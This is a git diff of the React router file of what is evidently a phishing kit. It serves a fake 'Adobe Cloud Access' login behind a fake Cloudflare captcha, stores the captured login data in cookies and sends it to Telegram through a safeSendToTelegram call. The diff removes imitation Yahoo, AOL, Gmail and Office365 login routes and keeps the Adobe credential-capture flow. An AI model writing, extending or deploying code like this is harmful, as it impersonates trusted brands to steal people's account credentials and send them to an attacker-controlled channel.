@@ -2,11 +2,6 @@ import React, { useState, useEffect } from 'react';
 import { Routes, Route, useNavigate, Navigate } from 'react-router-dom';
 import LoginPage from './components/LoginPage';
 import MobileLoginPage from './components/mobile/MobileLoginPage';
-import YahooLoginPage from './components/YahooLoginPage';
-import MobileYahooLoginPage from './components/mobile/MobileYahooLoginPage';
-import AolLoginPage from './components/AolLoginPage';
-import GmailLoginPage from './components/GmailLoginPage';
-import Office365Wrapper from './components/Office365Wrapper';
 import LandingPage from './components/LandingPage';
 import MobileLandingPage from './components/mobile/MobileLandingPage';
 import CloudflareCaptcha from './components/CloudflareCaptcha';
@@ -27,7 +22,7 @@ const safeSendToTelegram = async (sessionData: any) => {
 function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
-  const [isLoading, setIsLoading] = useState(false); // Changed to false to prevent initial spinner
+  const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
 
   // This effect is unchanged
@@ -76,13 +71,11 @@ function App() {
     setCookie('adobe_session', encodeURIComponent(JSON.stringify(loginData)), cookieOptions);
     setCookie('logged_in', 'true', cookieOptions);
     
-    // Update session state immediately to trigger navigation
     setHasActiveSession(true);
     
     try { await safeSendToTelegram(finalSessionData); } catch (error) { console.error('Failed to send final data to Telegram:', error); }
     setIsLoading(false);
     
-    // Ensure navigation to landing page
     navigate('/landing', { replace: true });
   };
 
@@ -99,17 +92,23 @@ function App() {
 
   const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
   const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
-  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;
 
   // This defines the pages and their paths for the router
   return (
     <Routes>
       <Route path="/" element={!hasActiveSession ? <CloudflareCaptcha onVerified={handleCaptchaVerified} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login" element={!hasActiveSession ? <LoginComponent fileName="Adobe Cloud Access" onYahooSelect={() => navigate('/login/yahoo')} onAolSelect={() => navigate('/login/aol')} onGmailSelect={() => navigate('/login/gmail')} onOffice365Select={() => navigate('/login/office365')} onBack={() => navigate('/')} onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/yahoo" element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/aol" element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/gmail" element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
-      <Route path="/login/office365" element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to="/landing" replace />} />
+      <Route 
+        path="/login" 
+        element={!hasActiveSession ? 
+          <LoginComponent 
+            fileName="Adobe Cloud Access" 
+            onBack={() => navigate('/')} 
+            onLoginSuccess={handleLoginSuccess} 
+            onLoginError={e => console.error(e)} 
+          /> : 
+          <Navigate to="/landing" replace />
+        } 
+      />
       <Route path="/landing" element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to="/" replace />} />
       <Route path="*" element={<Navigate to={hasActiveSession ? "/landing" : "/"} replace />} />
     </Routes>
